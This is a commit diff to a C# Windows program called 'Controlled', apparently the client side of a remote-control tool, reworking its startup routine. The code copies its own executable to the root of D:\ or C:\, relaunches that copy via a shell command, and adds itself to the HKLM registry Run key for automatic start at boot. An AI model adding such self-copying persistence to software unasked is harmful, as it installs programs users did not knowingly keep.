8af1874d07b8bf0d20eca488655f629d9141d514
slin1972 <lykin_1972@163.com>
2017-05-17 15:32:39 +0800

    'update'

--- controlled/c#/controlled/Controlled/Program.cs
+++ controlled/c#/controlled/Controlled/Program.cs
@@ -17,9 +17,32 @@ namespace Controlled
         static void Main()
         {
 
+            //如果进程已经存在
+            try
+            {
+                bool result = checkFirst();
+                if (!result)
+                {
+                    Application.ExitThread();
+                    Application.Exit(); 
+                    return;
+                }
+                SetAutoRun(Application.ExecutablePath, true);
+            }
+            catch (Exception e)
+            {
+                LogHelper.error(e.Message);
+            }
+            Application.EnableVisualStyles();
+            Application.SetCompatibleTextRenderingDefault(false);
+            Application.Run(new Form1());
+        }
+
+        private static bool checkFirst()
+        {
             string exePath = System.Environment.CurrentDirectory;
             LogHelper.info("start..." + exePath);
-            string exeFileName = Process.GetCurrentProcess().MainModule.FileName.Replace(exePath+@"\", "");
+            string exeFileName = Process.GetCurrentProcess().MainModule.FileName.Replace(exePath + @"\", "");
             IniFile iniFile = new IniFile(exePath + "/c.ini");
             bool r = isRunning();
             //判断是否是最终目录
@@ -27,13 +50,11 @@ namespace Controlled
             //判断是否是刚复制的最终路径
             string rpath_1 = iniFile.IniReadValue("config", "rpath_1");
 
-            //如果进程已经存在
             if (r)
             {
                 if (!"Y".Equals(rpath_1))
                 {
-                    Application.Exit();
-                    return;
+                    return false;
                 }
                 else
                 {
@@ -57,7 +78,7 @@ namespace Controlled
                         targetExe = @"D:\" + exeFileName;
                         System.IO.File.Copy(exePath + @"\" + exeFileName, targetExe, true);
                         iniFile = new IniFile(@"D:\" + "c.ini");
-                        cmd = "d:&&cd d:&&"+exeFileName;
+                        cmd = "d:&&cd d:&&" + exeFileName;
                     }
                     else
                     {
@@ -65,53 +86,20 @@ namespace Controlled
                         System.IO.File.Copy(exePath + @"\" + exeFileName, targetExe, true);
                         iniFile = new IniFile(@"C:\" + "c.ini");
                     }
-                    
+
                     if (targetExe != null)
                     {
                         iniFile.IniWriteValue("config", "rpath", "Y");
                         iniFile.IniWriteValue("config", "rpath_1", "Y");
                         LogHelper.error(targetExe);
                         Script.execute(cmd);
-                        Application.Exit();
-                        return;
+                        return false;
                     }
                 }
             }
 
-            iniFile.IniWriteValue("config", "register", "1");
-            String s = iniFile.IniReadValue("config", "register");
-
-            string exeName = "1scontrolled";
-            if (!"0".Equals(s))
-            {
-                string path = Application.ExecutablePath;
-                RegistryKey rk = Registry.LocalMachine;
-                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-                object aset = rk2.GetValue(exeName);
-                if (aset == null)
-                {
-                    rk2.SetValue(exeName, path);
-                }
-                rk2.Close();
-                rk.Close();
-            }
-            else //取消开机自启动  
-            {
-                string path = Application.ExecutablePath;
-                RegistryKey rk = Registry.LocalMachine;
-                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
-                 
-                object aset = rk2.GetValue(exeName);
-                if (aset != null)
-                {
-                    rk2.DeleteValue(exeName, false);
-                }
-                rk2.Close();
-                rk.Close();
-            } 
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new Form1());
+            LogHelper.info("started " + exePath);
+            return true;
         }
         static bool isRunning(){
             string strProcessName = System.Diagnostics.Process.GetCurrentProcess().ProcessName;
@@ -124,6 +112,32 @@ namespace Controlled
                 return true;
             }
             return false;
+        }
+        static void SetAutoRun(string fileName, bool isAutoRun)
+        {
+            RegistryKey reg = null;
+            try
+            {
+                if (!System.IO.File.Exists(fileName))
+                    throw new Exception("该文件不存在!");
+                String name = fileName.Substring(fileName.LastIndexOf(@"\") + 1);
+                reg = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+                if (reg == null)
+                    reg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
+                if (isAutoRun)
+                    reg.SetValue(name, fileName);
+                else
+                    reg.SetValue(name, false);
+            }
+            catch(Exception e)
+            {
+                throw e;
+            }
+            finally
+            {
+                if (reg != null)
+                    reg.Close();
+            }
         }
     }
 }
